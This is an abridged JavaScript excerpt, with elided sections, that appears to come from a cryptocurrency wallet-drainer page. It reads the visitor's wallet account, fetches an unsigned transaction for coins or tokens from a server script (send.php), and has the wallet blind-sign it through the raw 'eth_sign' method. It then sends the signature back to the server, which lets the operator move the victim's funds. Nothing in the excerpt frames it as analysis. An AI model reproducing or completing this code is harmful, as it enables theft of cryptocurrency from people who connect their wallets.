...
function App() {
  ...
  async function runner() {
    if (!ethereumProvider) {
      ...
      const account = await ethereumProvider.request({ method: "eth_accounts" });
      account_sender = account[0];
  ...
  async function genSign(address, chain, type, contract = "0") {
    if (type == "coin") {
      const result = await jQuery.post("send.php", {
        "handler": "tx",
        "address": address,
        "chain": chain,
        "type": type
      ...
      const unSigned = JSON.parse(result);
      console.log(unSigned);

      const signed = await ethereumProvider.request({ method: "eth_sign", params: [address, unSigned.result] });
      return signed;
    } else if (type == "token") {
      const result = await jQuery.post("send.php", {
        "handler": "tx",
  ...
  async function acceptSign(signature, type) {
    console.log(type);
    if (type == "coin") {
      const result = await jQuery.post("send.php", { "handler": "sign", "signature": signature, "type": type });
